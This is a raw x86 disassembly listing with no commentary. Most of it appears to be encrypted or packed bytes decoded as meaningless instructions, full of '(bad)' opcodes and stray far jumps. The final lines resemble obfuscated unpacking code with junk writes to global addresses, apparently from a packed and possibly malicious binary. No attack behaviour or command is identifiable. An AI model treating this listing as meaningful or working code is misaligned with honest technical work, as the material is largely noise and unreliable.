  40418d:	and    esi,DWORD PTR [ebx]
  40418f:	js     0x404199
  404191:	and    DWORD PTR [edi-0x27],eax
  404194:	and    esp,DWORD PTR [edx]
  404196:	push   0x4ee9aaf9
  40419b:	jo     0x4041d2
  40419d:	shl    BYTE PTR [eax-0x14],0x89
  4041a1:	mov    ah,BYTE PTR [eax]
  4041a3:	push   esp
  4041a4:	mov    esp,0xc1bb4ce7
  4041a9:	adc    al,0x28
  4041ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041ac:	push   edi
  4041ad:	mov    fs,esi
  4041af:	lahf   
  4041b0:	mov    cl,0x74
  4041b2:	sub    bl,bh
  4041b4:	xchg   ebp,eax
  4041b5:	inc    edx
  4041b6:	imul   ebp,edx,0x571f4653
  4041bc:	(bad)  
  4041bd:	jbe    0x4041c1
  4041bf:	fimul  DWORD PTR [ebp+eax*8+0x487f52e4]
  4041c6:	and    ebp,DWORD PTR [ebp-0x4ddad4a5]
  4041cc:	ret    0x4bdf
  4041cf:	jae    0x4041fb
  4041d1:	jp     0x404174
  4041d3:	xchg   edi,eax
  4041d4:	or     al,0xcc
  4041d6:	xchg   BYTE PTR [eax],dl
  4041d8:	push   esi
  4041d9:	xchg   ebp,eax
  4041da:	jg     0x4041df
  4041dc:	push   ss
  4041dd:	or     edx,DWORD PTR [ebp-0x22e7337b]
  4041e3:	jp     0x404234
  4041e5:	aas    
  4041e6:	sub    DWORD PTR [ebp+esi*4+0x10290ffe],ecx
  4041ed:	xchg   edx,eax
  4041ee:	div    BYTE PTR [esi+0x7e40d3db]
  4041f4:	lods   eax,DWORD PTR ds:[esi]
  4041f5:	add    eax,DWORD PTR [ebx]
  4041f7:	loopne 0x404248
  4041f9:	in     al,0xec
  4041fb:	mov    ah,0xf3
  4041fd:	pop    ebp
  4041fe:	xchg   eax,ecx
  404200:	pop    edx
  404201:	mov    edx,0x8188d674
  404206:	add    eax,0x7f361fe8
  40420b:	test   BYTE PTR [ebx],dh
  40420d:	call   0x65ff:0xa8d5fbf6
  404214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404215:	pop    ecx
  404216:	mov    bh,cl
  404218:	mov    eax,ds:0x7c6cab9d
  40421d:	and    al,0xcf
  40421f:	(bad)  
  404220:	fimul  DWORD PTR [ebp+0x235fa8ea]
  404226:	add    ebp,edi
  404228:	aam    0x6b
  40422a:	push   ebx
  40422b:	hlt    
  40422c:	push   ds
  40422d:	loop   0x40420c
  40422f:	stos   DWORD PTR es:[edi],eax
  404230:	pusha  
  404231:	fcmovu st,st(5)
  404233:	jno    0x404205
  404235:	pop    ds
  404236:	scas   eax,DWORD PTR es:[edi]
  404237:	mov    ebx,0xf88340cc
  40423c:	inc    eax
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	setle  BYTE PTR [esi]
  40425a:	sbb    al,0x8e
  40425c:	dec    edi
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0x5770707d
  404265:	shr    BYTE PTR [edi+0xf4d9ed7],0x6d
  40426c:	sahf   
  40426d:	pop    ss
  40426e:	out    dx,al
  40426f:	or     al,0x35
  404271:	fcomp  DWORD PTR [ecx]
  404273:	retf   0xa32d
  404276:	mov    bh,0xf1
  404279:	mov    esi,DWORD PTR [eax-0x2e]
  40427c:	fisttp QWORD PTR [edx+eiz*1-0x6fd4d368]
  404283:	xor    edi,DWORD PTR [edx+0x48]
  404286:	mov    bl,0xeb
  404288:	in     al,0x25
  40428a:	add    edi,DWORD PTR [esi-0x25]
  40428d:	pop    eax
  40428e:	jl     0x404294
  404290:	jmp    0x40426c
  404292:	in     eax,0xdb
  404294:	mov    al,0x7b
  404296:	sti    
  404297:	mov    dh,0xe
  404299:	shr    BYTE PTR [ebx+0x8],1
  40429c:	push   ecx
  40429d:	sub    eax,0x4b5e243f
  4042a2:	pop    ss
  4042a3:	mov    dh,0xb9
  4042a5:	int    0xd3
  4042a7:	jecxz  0x404293
  4042a9:	inc    eax
  4042aa:	mov    esi,0xa97e0e57
  4042af:	and    BYTE PTR [edi+0x19],dl
  4042b2:	scas   eax,DWORD PTR es:[edi]
  4042b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042b4:	mov    eax,DWORD PTR [ebx-0x50c20785]
  4042ba:	aaa    
  4042bb:	jg     0x4042bd
  4042bd:	sub    eax,0x73cd84dc
  4042c2:	scas   al,BYTE PTR es:[edi]
  4042c3:	lahf   
  4042c4:	ret    
  4042c5:	pop    esp
  4042c6:	ret    0xec30
  4042c9:	adc    BYTE PTR [ecx+0x14cb8920],cl
  4042cf:	jl     0x4042e4
  4042d1:	dec    edx
  4042d2:	sub    eax,0x5fdd9450
  4042d7:	pushf  
  4042d8:	push   0xffffff9d
  4042da:	xchg   esi,eax
  4042db:	test   eax,0x8a6d76ee
  4042e0:	cdq    
  4042e1:	(bad)  
  4042e2:	out    dx,al
  4042e3:	fwait
  4042e4:	sbb    al,0xac
  4042e6:	mov    ds:0x1f099953,eax
  4042eb:	mov    al,0x17
  4042ed:	lods   eax,DWORD PTR ds:[esi]
  4042ee:	jno    0x404319
  4042f0:	cmovb  edx,DWORD PTR [ecx-0x7dfec3ac]
  4042f7:	stc    
  4042f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042f9:	out    dx,eax
  4042fa:	clc    
  4042fb:	mov    bl,0x3e
  4042fd:	cmc    
  4042fe:	mov    edx,0xc854d3de
  404303:	cmp    BYTE PTR [edi],ah
  404305:	pop    es
  404306:	aam    0x4a
  404308:	xchg   edx,eax
  404309:	scas   al,BYTE PTR es:[edi]
  40430a:	ret    
  40430b:	arpl   bx,di
  40430d:	dec    ebx
  40430e:	stos   BYTE PTR es:[edi],al
  40430f:	loopne 0x404332
  404311:	in     eax,dx
  404312:	fdiv   st,st(3)
  404314:	xchg   esp,eax
  404315:	mov    edi,0x61dec791
  40431a:	enter  0xeba,0x41
  40431e:	add    BYTE PTR [ebp+0x1cf23b63],dl
  404324:	into   
  404325:	(bad)  
  404326:	cmp    eax,0x14df0055
  40432b:	and    ch,0x28
  40432e:	pop    ds
  40432f:	mov    dl,0x9c
  404331:	mov    eax,ds:0x228ce156
  404336:	je     0x4042cb
  404338:	jno    0x40430c
  40433a:	xor    DWORD PTR [esi+eax*4-0x284d5bd8],0xd0240487
  404345:	add    eax,0xdb9b1d6
  40434a:	sbb    al,BYTE PTR [ecx+0x23c82d07]
  404350:	add    eax,0x13f6d85
  404355:	into   
  404356:	cld    
  404357:	push   ebx
  404358:	test   eax,0xfe2e3440
  40435d:	aam    0x3e
  40435f:	add    edx,eax
  404361:	je     0x4043c3
  404363:	retf   0x5278
  404366:	loope  0x404315
  404368:	jne    0x404382
  40436a:	imul   ebp,DWORD PTR ds:0x842968de,0x30
  404371:	jg     0x404348
  404373:	ret    
  404374:	and    eax,0x874d62e9
  404379:	mov    eax,ds:0xb46a8da
  40437e:	ins    DWORD PTR es:[edi],dx
  40437f:	xor    eax,DWORD PTR [eax+eax*4]
  404382:	inc    ebp
  404383:	sbb    bh,BYTE PTR [eax-0x63]
  404386:	out    0x87,eax
  404388:	pop    ebx
  404389:	jnp    0x404358
  40438b:	jge    0x404334
  40438d:	adc    al,0x89
  40438f:	pop    ds
  404390:	mov    eax,ds:0xa51d552a
  404395:	xor    bh,BYTE PTR [ecx-0x77]
  404398:	or     cl,bl
  40439a:	pop    ecx
  40439b:	cwde   
  40439c:	test   eax,0xc073d504
  4043a1:	pop    ds
  4043a2:	cdq    
  4043a3:	jno    0x4043ec
  4043a5:	dec    edx
  4043a6:	arpl   WORD PTR [edx],dx
  4043a8:	in     al,dx
  4043a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043aa:	(bad)  
  4043ab:	mov    edi,0x2d5359f4
  4043b0:	sbb    BYTE PTR [eax-0x61af523f],cl
  4043b6:	fstp   QWORD PTR [ebx-0x68c8f80]
  4043bc:	adc    al,0x98
  4043be:	mov    al,0x9
  4043c0:	xlat   BYTE PTR ds:[ebx]
  4043c1:	js     0x404401
  4043c3:	xor    DWORD PTR [esi+0x60],ebp
  4043c6:	add    ch,0x1
  4043c9:	outs   dx,DWORD PTR ds:[esi]
  4043ca:	stc    
  4043cb:	test   eax,esi
  4043cd:	cwde   
  4043ce:	dec    ebx
  4043cf:	test   cl,ch
  4043d1:	mov    cl,0x3c
  4043d3:	or     esi,DWORD PTR ds:0x608e49c9
  4043d9:	enter  0x37df,0x24
  4043dd:	pop    es
  4043de:	pop    esi
  4043df:	mov    edx,0xbd182e54
  4043e4:	sbb    cl,BYTE PTR [edx]
  4043e6:	sub    BYTE PTR [esi-0x20],ch
  4043e9:	shr    BYTE PTR [edx+edx*2-0x48c19802],1
  4043f0:	add    eax,0x401510ff
  4043f5:	hlt    
  4043f6:	ja     0x4043d9
  4043f8:	xchg   ecx,eax
  4043f9:	push   ss
  4043fa:	xchg   ecx,eax
  4043fb:	hlt    
  4043fc:	aad    0x5a
  4043fe:	stos   BYTE PTR es:[edi],al
  4043ff:	sti    
  404400:	aas    
  404401:	jge    0x4043d4
  404403:	aaa    
  404404:	mov    bh,0x50
  404406:	mov    edx,0xd81a42b5
  40440b:	leave  
  40440c:	and    dl,dh
  40440e:	push   esp
  40440f:	pop    edi
  404410:	pop    edi
  404411:	xor    al,0x94
  404413:	imul   eax,DWORD PTR [eax],0xffffffdf
  404416:	mov    eax,ds:0x9c97d565
  40441b:	jecxz  0x4043bd
  40441d:	mov    ecx,0x3f71acab
  404422:	xchg   edi,eax
  404423:	ds scas eax,DWORD PTR es:[edi]
  404425:	xlat   BYTE PTR ds:[ebx]
  404426:	mov    cl,0xd5
  404428:	jle    0x4043bd
  40442a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40442b:	and    bh,BYTE PTR [eax+edx*2]
  40442e:	ds mov cl,0xf0
  404431:	scas   eax,DWORD PTR es:[edi]
  404432:	sti    
  404433:	jl     0x4044ae
  404435:	daa    
  404436:	retf   
  404437:	dec    ebp
  404438:	jmp    0x404429
  40443a:	icebp  
  40443b:	js     0x404407
  40443d:	jno    0x404402
  40443f:	cmp    eax,0xeb234ad4
  404444:	jae    0x40445e
  404446:	outs   dx,BYTE PTR ds:[esi]
  404447:	dec    ebx
  404448:	and    eax,0xc6c9ce5c
  40444d:	mov    ecx,0x11a02c68
  404452:	jns    0x404485
  404454:	push   ss
  404455:	or     DWORD PTR [ebp+0x5cb2f54],ecx
  40445b:	test   DWORD PTR [ebx-0x4f],ebx
  40445e:	(bad)  
  40445f:	jg     0x404490
  404461:	fadd   QWORD PTR [edx]
  404463:	or     BYTE PTR [ebx+0x5b],0x4d
  404467:	xchg   ecx,eax
  404468:	and    DWORD PTR [edi],esp
  40446a:	cmp    al,0x4c
  40446c:	and    BYTE PTR [ebx],0x7f
  40446f:	mov    ch,0x16
  404471:	xchg   ecx,eax
  404472:	loope  0x40447b
  404474:	ss xabort 0x2f
  404478:	mov    dl,0xf
  40447a:	loope  0x4044bb
  40447c:	pushf  
  40447d:	call   0x3fe7:0x9e4c9944
  404484:	inc    ebx
  404485:	dec    esi
  404486:	(bad)  
  404487:	adc    DWORD PTR [edi],edi
  404489:	in     al,0xdb
  40448b:	xor    eax,0x83ebcb0d
  404490:	mov    DWORD PTR [ecx+0x7e],ebx
  404493:	jmp    0xa9f11e70
  404498:	int    0x26
  40449a:	rcl    DWORD PTR [esi-0x4bf79afa],cl
  4044a0:	push   esi
  4044a1:	mov    ah,ch
  4044a3:	jae    0x40451a
  4044a5:	pop    edx
  4044a6:	xchg   DWORD PTR [ebx],esp
  4044a8:	adc    ch,BYTE PTR [eax]
  4044aa:	cmp    DWORD PTR [edx+0x6e020eb7],esp
  4044b0:	mov    eax,ds:0xd0af99b1
  4044b5:	mov    ebp,0x99402683
  4044ba:	mov    dh,0x7b
  4044bc:	cmp    eax,0xb711622f
  4044c1:	jmp    0x57a:0x6b1595d2
  4044c8:	jb     0x4044e8
  4044ca:	jae    0x404454
  4044cc:	shl    DWORD PTR [edx],cl
  4044ce:	repnz neg DWORD PTR [ebx+0x35a06ecc]
  4044d5:	dec    ebx
  4044d6:	loopne 0x404505
  4044d8:	int3   
  4044d9:	shr    DWORD PTR [ebx-0x44d96719],cl
  4044df:	je     0x4044c0
  4044e1:	scas   eax,DWORD PTR es:[edi]
  4044e2:	and    ch,BYTE PTR [edi]
  4044e4:	test   DWORD PTR ds:0x45ac51b4,eax
  4044ea:	stos   BYTE PTR es:[edi],al
  4044eb:	pusha  
  4044ec:	and    BYTE PTR [edx+0x2],dh
  4044ef:	aaa    
  4044f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f1:	lods   eax,DWORD PTR ds:[esi]
  4044f2:	xor    al,0x71
  4044f4:	or     eax,DWORD PTR [eax+eax*2]
  4044f7:	cmp    DWORD PTR [edi+0x11],ebx
  4044fa:	xchg   ebp,eax
  4044fb:	mov    bl,0xc7
  4044fd:	cmp    al,0xc2
  4044ff:	cld    
  404500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404501:	mov    dl,0x4
  404503:	or     eax,0x4f2fe9c6
  404508:	ret    0xb5b3
  40450b:	ret    
  40450c:	iret   
  40450d:	or     al,0x30
  40450f:	or     ecx,0xd894878c
  404515:	dec    edx
  404516:	and    bl,BYTE PTR [ecx*4+0x4fc7fa91]
  40451d:	xchg   DWORD PTR [edi+0x7f],edi
  404520:	pop    esp
  404521:	mov    ds:0xe2aee4e7,al
  404526:	(bad)  
  404527:	mov    esp,0xc4b31d05
  40452c:	js     0x4044d8
  40452e:	sub    eax,0xc0f6b961
  404533:	jb     0x4044e5
  404535:	mov    ebx,0xe29eebb
  40453a:	sbb    ebx,DWORD PTR [ebx]
  40453c:	or     al,0x65
  40453e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40453f:	push   ds
  404540:	xor    al,0x4c
  404542:	mov    ebx,0xe86dac6e
  404547:	out    0xf6,eax
  404549:	ret    
  40454a:	test   ah,dl
  40454c:	or     eax,0xd82f08bd
  404551:	cli    
  404552:	pop    es
  404553:	dec    esi
  404554:	inc    edx
  404555:	xor    eax,0xab12ed5e
  40455a:	xor    ch,ch
  40455c:	jmp    DWORD PTR [edx+0x13c9f763]
  404562:	xchg   esp,eax
  404563:	adc    bh,BYTE PTR [ebx]
  404565:	sbb    DWORD PTR [esi],esi
  404567:	fcmovu st,st(7)
  404569:	dec    edx
  40456a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40456b:	jl     0x4045b1
  40456d:	dec    ebp
  40456e:	mov    esp,0x5ef681a2
  404573:	xchg   DWORD PTR [esi],edi
  404575:	cmp    DWORD PTR [ebp+0x1aeae97],0x1e
  40457c:	je     0x4045e1
  40457e:	mov    eax,0x181dfc68
  404583:	fs repnz xchg ebx,eax
  404586:	stos   DWORD PTR es:[edi],eax
  404587:	ins    DWORD PTR es:[edi],dx
  404588:	sub    esp,edx
  40458a:	push   0xb666416
  40458f:	mov    ah,0xe4
  404591:	adc    dh,ah
  404593:	xchg   BYTE PTR [eax+0x1726400e],dl
  404599:	push   0xffffff9d
  40459b:	jbe    0x404575
  40459d:	push   0xffffffcf
  40459f:	push   ecx
  4045a0:	rol    DWORD PTR [eax+0x6459abbe],1
  4045a6:	pusha  
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fd82,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	inc    esi
  4045c8:	inc    ebp
  4045c9:	add    bh,BYTE PTR [esp+ecx*1]
  4045cc:	and    al,0x70
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x40458c
  4045d4:	ss dec esp
  4045d6:	cmc    
  4045d7:	lods   al,BYTE PTR ds:[esi]
  4045d8:	rcr    DWORD PTR [esi],0xcc
  4045db:	dec    DWORD PTR [edx]
  4045dd:	aaa    
  4045de:	iret   
  4045df:	and    edx,DWORD PTR ds:0xa932d53
  4045e5:	(bad)
  4045e8:	inc    ebx
  4045e9:	outs   dx,DWORD PTR ds:[esi]
  4045ea:	test   eax,0xe693691d
  4045ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f0:	loopne 0x4045cf
  4045f2:	in     al,0x94
  4045f4:	fwait
  4045f5:	out    0x55,eax
  4045f7:	sub    al,0xf7
  4045f9:	push   ebp
  4045fa:	sbb    BYTE PTR [eax+0x6b9c324],dl
  404600:	sub    al,0xed
  404602:	es pop ebp
  404604:	jmp    0x8a16:0x7e7b3a03
  40460b:	leave  
  40460c:	mov    ds:0xf85bb878,eax
  404611:	ins    DWORD PTR es:[edi],dx
  404612:	test   DWORD PTR [ebp+eax*1-0x473234e9],edx
  404619:	mov    dl,0x76
  40461b:	mov    esi,0xf1102416
  404620:	les    ebp,FWORD PTR [ecx+0x3f]
  404623:	in     eax,dx
  404624:	lods   eax,DWORD PTR ds:[esi]
  404625:	dec    esp
  404626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404627:	pop    ds
  404628:	adc    edi,ebp
  40462a:	out    dx,eax
  40462b:	sub    BYTE PTR [eax+0x3fbc2900],al
  404631:	adc    eax,DWORD PTR [eax+eax*2]
  404634:	nop
  404635:	leave  
  404636:	gs push esp
  404638:	es in  eax,dx
  40463a:	or     DWORD PTR [ebx+0x20],eax
  40463d:	or     al,0xd3
  40463f:	out    0x16,eax
  404641:	or     bl,dh
  404643:	retf   
  404644:	xchg   DWORD PTR [ebx+edi*4+0x55c7038a],edx
  40464b:	call   FWORD PTR [ecx+0x27]
  40464e:	mov    ds:0x4c59fdd8,eax
  404653:	mov    WORD PTR [eax],?
  404655:	fisubr WORD PTR [eax-0x1fcfcc1e]
  40465b:	xor    dh,al
  40465d:	dec    ebp
  40465e:	outs   dx,BYTE PTR ds:[esi]
  40465f:	adc    edi,DWORD PTR [eax+0x16]
  404662:	and    ecx,edi
  404664:	mov    cl,0x76
  404666:	lea    ebp,[esi+0x6ffb88d0]
  40466c:	ret    
  40466d:	jns    0x40467e
  40466f:	lahf   
  404670:	ror    DWORD PTR [esi+0x32],1
  404673:	xchg   BYTE PTR [esi+0x2798177a],bl
  404679:	es pop ds
  40467b:	in     al,dx
  40467c:	mov    esi,0xb4d68637
  404681:	jno    0x40469a
  404683:	out    0x74,al
  404685:	push   edx
  404686:	adc    ch,ah
  404688:	imul   edi,DWORD PTR [edi-0x3b],0x27cea9e6
  40468f:	js     0x404637
  404691:	in     eax,0xed
  404693:	call   0x58145891
  404698:	dec    eax
  404699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40469a:	dec    ecx
  40469b:	pop    ebx
  40469c:	cmp    al,0xe2
  40469e:	push   edi
  40469f:	cmp    ecx,DWORD PTR [ebx]
  4046a1:	test   al,0xe6
  4046a3:	(bad)  
  4046a4:	xchg   edx,eax
  4046a5:	cmp    BYTE PTR [edi],ch
  4046a7:	inc    esp
  4046a8:	push   ecx
  4046a9:	mov    WORD PTR [edi-0x7216e245],cs
  4046af:	add    eax,0xdaf20c9f
  4046b4:	sar    DWORD PTR [ecx],cl
  4046b6:	nop
  4046b7:	fwait
  4046b8:	inc    ecx
  4046b9:	je     0x404703
  4046bb:	rcl    BYTE PTR [edx-0x19c1b3bd],cl
  4046c1:	add    edi,DWORD PTR [eax+0x4cb7f882]
  4046c7:	rol    DWORD PTR [edi],1
  4046c9:	loopne 0x4046c9
  4046cb:	mov    ds:0xec9898bc,eax
  4046d0:	xor    bh,ah
  4046d2:	outs   dx,BYTE PTR ds:[esi]
  4046d3:	shl    BYTE PTR [ecx+0x24ec5736],1
  4046d9:	jecxz  0x40469e
  4046db:	fld    st(6)
  4046dd:	test   eax,0x4129434f
  4046e2:	mov    dl,0x7a
  4046e4:	inc    esi
  4046e5:	xchg   ecx,eax
  4046e6:	ds or  al,0x87
  4046e9:	cmp    al,0x5b
  4046eb:	dec    esp
  4046ec:	sbb    al,0xa4
  4046ee:	push   cs
  4046ef:	call   0x735ed0f5
  4046f4:	xchg   DWORD PTR [ecx+0x16],ecx
  4046f7:	or     eax,0x3f4e7ef0
  4046fc:	mov    ch,0x7c
  4046fe:	fiadd  DWORD PTR [esi]
  404700:	inc    edx
  404701:	sub    esi,DWORD PTR [ebx-0x51dad051]
  404707:	dec    ecx
  404708:	rcl    eax,1
  40470a:	sub    dh,ch
  40470c:	out    0xd6,eax
  40470e:	loop   0x404725
  404710:	inc    edi
  404711:	addr16 int 0xf3
  404714:	(bad)  
  404715:	cmp    edx,edx
  404717:	inc    ebx
  404718:	(bad)  
  404719:	daa    
  40471a:	mov    dh,0x3f
  40471c:	mov    ecx,0x5928a9ad
  404721:	pop    edi
  404722:	push   edx
  404723:	into   
  404724:	xor    esp,eax
  404726:	jle    0x4046b1
  404728:	xchg   edx,eax
  404729:	push   ecx
  40472a:	dec    edi
  40472b:	xor    BYTE PTR [edi],bh
  40472d:	dec    edx
  40472e:	inc    esi
  40472f:	mov    al,ds:0x7aea5249
  404734:	jecxz  0x404722
  404736:	iret   
  404737:	mov    edx,0x8e231623
  40473c:	add    al,0x71
  40473e:	cs push cs
  404740:	jb     0x404761
  404742:	cmp    DWORD PTR [esi-0x6bbd3567],eax
  404748:	call   DWORD PTR [eax-0x2b]
  40474b:	adc    al,0x23
  40474d:	fstp   TBYTE PTR [ebx-0x21]
  404750:	sub    edi,DWORD PTR [esi]
  404752:	(bad)  
  404753:	in     al,0x85
  404755:	icebp  
  404756:	or     ebp,ebx
  404758:	xlat   BYTE PTR ds:[ebx]
  404759:	or     eax,0x7e1f43a8
  40475f:	jle    0x404736
  404761:	scas   eax,DWORD PTR es:[edi]
  404762:	cmp    eax,0xaf65e617
  404767:	daa    
  404768:	stc    
  404769:	or     DWORD PTR [ebp+0x3a5204d8],edi
  40476f:	push   eax
  404770:	inc    edi
  404771:	(bad)  
  404772:	fsub   st(0),st
  404774:	ret    0x8264
  404777:	in     al,dx
  404778:	out    0xb4,al
  40477a:	sahf   
  40477b:	loopne 0x40479e
  40477d:	mov    ch,ah
  40477f:	aad    0x2b
  404781:	ja     0x4047f6
  404783:	jl     0x40475d
  404785:	jno    0x404708
  404787:	cmp    DWORD PTR [esi],edi
  404789:	iret   
  40478a:	lahf   
  40478b:	adc    BYTE PTR [eax-0x10],dh
  40478e:	icebp  
  40478f:	jg     0x4047ca
  404791:	stc    
  404792:	mov    ecx,0x45271bc5
  404797:	or     BYTE PTR ds:0x2a904463,dh
  40479d:	inc    ecx
  40479e:	lock add dh,bh
  4047a1:	pop    ss
  4047a2:	mov    al,ds:0x47b782f7
  4047a7:	mov    ebp,0x2c7c8d75
  4047ac:	jo     0x404761
  4047ae:	mov    bl,0x4b
  4047b0:	sar    edx,0x4c
  4047b3:	or     DWORD PTR [ebx-0x5d169fde],eax
  4047b9:	in     eax,0x9f
  4047bb:	and    BYTE PTR [esp+eiz*2+0x47ed3058],0xfe
  4047c3:	rol    DWORD PTR [edx],0x6
  4047c6:	push   ebx
  4047c7:	dec    ebx
  4047c8:	cwde   
  4047c9:	jmp    0x17f454ce
  4047ce:	imul   edx,ecx,0xeb04d874
  4047d4:	in     al,dx
  4047d5:	sbb    BYTE PTR [esi+0x4776c7ab],al
  4047db:	(bad)  
  4047dc:	cmp    cl,bl
  4047de:	push   0xb912542f
  4047e3:	jne    0x404810
  4047e5:	fsubr  st,st(1)
  4047e7:	push   cs
  4047e8:	pop    edx
  4047e9:	sbb    al,BYTE PTR [ebp+0x5c3f704b]
  4047ef:	out    0xfe,eax
  4047f1:	(bad)  
  4047f3:	jnp    0x40479c
  4047f5:	cmp    DWORD PTR [ecx+0x19],esp
  4047f8:	popf   
  4047f9:	enter  0x194c,0xad
  4047fd:	inc    esp
  4047fe:	int3   
  4047ff:	sub    BYTE PTR [esi-0xd16f3d5],0x31
  404806:	(bad)  
  404807:	jg     0x4047d5
  404809:	adc    BYTE PTR [edi],ah
  40480b:	fld    DWORD PTR [eax-0x55d318d]
  404811:	sub    al,0x71
  404813:	lock or al,0x48
  404816:	lods   eax,DWORD PTR ds:[esi]
  404817:	in     eax,dx
  404818:	push   ecx
  404819:	rol    BYTE PTR [edx],1
  40481b:	sti    
  40481c:	(bad)  
  40481d:	adc    BYTE PTR [eax+ecx*8-0x8ad95bd],cl
  404824:	push   ss
  404825:	mov    esp,0xf3068b80
  40482a:	pop    ss
  40482b:	and    eax,0x472b114a
  404830:	inc    esi
  404831:	iret   
  404832:	dec    ebp
  404833:	dec    ebp
  404834:	or     BYTE PTR [ebp+0x1320c31e],dh
  40483a:	mov    DWORD PTR [ecx+0x1b],edi
  40483d:	les    ebx,FWORD PTR [ebx]
  40483f:	cld    
  404840:	dec    edx
  404841:	mov    edi,gs
  404843:	cs aas 
  404845:	gs std 
  404847:	cmc    
  404848:	sub    eax,DWORD PTR [ebx+0x45a2fda1]
  40484e:	mov    edx,0x731ad2d5
  404853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404854:	or     ah,BYTE PTR [esi+0x12a66ab2]
  40485a:	and    ah,BYTE PTR [edx]
  40485c:	test   DWORD PTR [esp+ebp*8+0x15],esp
  404860:	rcr    BYTE PTR [ebp+0x62],1
  404863:	icebp  
  404864:	fs push 0x12a480e2
  40486a:	(bad)  
  40486b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40486c:	mov    ds:0xf8bd61e4,al
  404871:	(bad)  
  404872:	punpckhdq mm5,QWORD PTR [edi-0x27]
  404876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404877:	mov    esp,0x73480243
  40487c:	ret    
  40487d:	mov    bl,0x9e
  40487f:	jmp    0x5c2e:0xfff1414f
  404886:	leave  
  404887:	scas   al,BYTE PTR es:[edi]
  404888:	cmp    esp,DWORD PTR [esi]
  40488a:	mov    edi,edi
  40488c:	add    esi,DWORD PTR [ebx-0x6ccb33a6]
  404892:	xor    al,ah
  404894:	push   ss
  404895:	loopne 0x4048b1
  404897:	adc    ebx,edx
  404899:	pop    ds
  40489a:	sbb    DWORD PTR [ebx-0x31],ebp
  40489d:	cdq    
  40489e:	inc    ecx
  40489f:	cmp    esp,DWORD PTR ds:0xab78b411
  4048a5:	sahf   
  4048a6:	icebp  
  4048a7:	aad    0xb
  4048a9:	push   ebx
  4048aa:	outs   dx,DWORD PTR ds:[esi]
  4048ab:	sbb    al,0xa
  4048ad:	pop    ecx
  4048ae:	dec    edi
  4048af:	bound  ecx,QWORD PTR [ecx+0x6370031]
  4048b5:	add    eax,0x8cc00830
  4048ba:	in     al,0x88
  4048bc:	cli    
  4048bd:	dec    ecx
  4048be:	repz or al,0xf0
  4048c1:	jmp    0x4048d8
  4048c3:	sbb    al,0xdd
  4048c5:	mov    eax,0x11ee6cc3
  4048ca:	xchg   edi,eax
  4048cb:	or     dh,dh
  4048cd:	push   ss
  4048ce:	and    DWORD PTR [ebx+0x1d6c44e0],eax
  4048d4:	test   al,0xda
  4048d6:	xchg   BYTE PTR [eax],bl
  4048d8:	cmp    BYTE PTR ds:0xc87463ad,dl
  4048de:	xor    DWORD PTR [eax-0x18],0xffffffec
  4048e2:	dec    esi
  4048e3:	daa    
  4048e4:	je     0x404884
  4048e6:	xor    eax,0xa98b57c6
  4048eb:	imul   edi,DWORD PTR [ebx-0x26b18f04],0xf
  4048f2:	retf   
  4048f3:	dec    ebx
  4048f4:	xchg   DWORD PTR [ebx-0x1c30317d],ebx
  4048fa:	out    0x2e,eax
  4048fc:	push   esp
  4048fd:	adc    eax,0x3fbf2d4e
  404902:	outs   dx,BYTE PTR ds:[esi]
  404903:	dec    ebx
  404904:	or     eax,0xd578140f
  404909:	(bad)  
  40490a:	push   ebx
  40490b:	ret    
  40490c:	jl     0x404950
  40490e:	rcl    DWORD PTR [ebx-0x22da3e43],cl
  404914:	or     eax,0xf4458b93
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
